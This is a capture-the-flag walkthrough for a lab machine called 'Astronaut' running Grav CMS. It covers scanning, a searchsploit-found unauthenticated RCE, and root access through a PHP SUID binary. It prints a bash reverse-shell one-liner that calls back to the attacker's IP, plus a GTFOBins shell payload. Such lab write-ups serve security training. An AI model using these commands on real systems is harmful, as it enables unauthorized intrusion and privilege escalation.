---
icon: ubuntu
---

# Astronaut - Easy

## Gaining Access

Nmap scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn $ip -oN scans/nmap-tcpall                                                                                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-25 17:11 EDT                                                                               
Nmap scan report for 192.168.225.12                                                                                                           
Host is up (0.032s latency).                                                                                                                  
Not shown: 65533 closed tcp ports (reset)                                                                                                     
PORT   STATE SERVICE VERSION                                                                                                                  
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)                                                             
| ssh-hostkey:                                                                                                                                
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)                                                                                
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)                                                                               
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)                                                                             
80/tcp open  http    Apache httpd 2.4.41                                                                                                      
| http-ls: Volume /                                                                                                                           
| SIZE  TIME              FILENAME                                                                                                            
| -     2021-03-17 17:46  grav-admin/                                                                                                         
|_                                                                                                                                            
|_http-title: Index of /                                                                                                                      
|_http-server-header: Apache/2.4.41 (Ubuntu)                                                                                                  
Device type: general purpose                                                                                                                  
Running: Linux 5.X                                                                                                                            
OS CPE: cpe:/o:linux:linux_kernel:5                                                                                                           
OS details: Linux 5.0 - 5.14                                                                                                                  
Network Distance: 4 hops                                                                                                                      
Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel                                                                      
                                                                                                                                              
TRACEROUTE (using port 5900/tcp)                                                                                                              
HOP RTT      ADDRESS                                                                                                                          
1   24.78 ms 192.168.45.1
2   24.74 ms 192.168.45.254
3   25.07 ms 192.168.251.1
4   25.12 ms 192.168.225.12
```

### HTTT Port 80

As soon as we visit the website we are greeted by the GRAV CMS Page

<figure><img src="../../.gitbook/assets/image (1652).png" alt=""><figcaption></figcaption></figure>

### Directory Busting

```
dirsearch -u http://192.168.225.12/grav-admin/
```

<figure><img src="../../.gitbook/assets/image (1653).png" alt=""><figcaption></figcaption></figure>

Any page we choose to access redirects us to the login page

<figure><img src="../../.gitbook/assets/image (1654).png" alt=""><figcaption></figcaption></figure>

I tried a couple of default credentials that did not work, and after I started looking for available exploits.

### Grav 1.10.7 Arbitrary Yaml Write/Update Unauthenticated RCE

```
searchsploit grav
```

<figure><img src="../../.gitbook/assets/image (1655).png" alt=""><figcaption></figcaption></figure>

Reveals an unauthenticated exploit let's take a look at it, before we can run it we must make a couple of changes to it. First we have to update the target's url path and incorporate a base64 encoded bash reverse shell containing our attack's machine ip and listening port.

```
echo -ne "bash -i >& /dev/tcp/192.168.45.243/80 0>&1" | base64 -w0
```

<figure><img src="../../.gitbook/assets/image (1656).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1657).png" alt=""><figcaption></figcaption></figure>

Before running the eploit make sure you have a listener ready. Running the exploit delivers us a reverse shell as www-data

<figure><img src="../../.gitbook/assets/image (1659).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1658).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### PHP SUID

Linpeas highlights the php SUID binary for us

<figure><img src="../../.gitbook/assets/image (1660).png" alt=""><figcaption></figcaption></figure>

[**Gtfobins**](https://gtfobins.github.io/gtfobins/php/#suid) help us exploit this SUID

<figure><img src="../../.gitbook/assets/image (1661).png" alt=""><figcaption></figcaption></figure>

```
/usr/bin/php7.4 -r "pcntl_exec('/bin/sh', ['-p']);"
```

<figure><img src="../../.gitbook/assets/image (1662).png" alt=""><figcaption></figcaption></figure>

And we are now root!
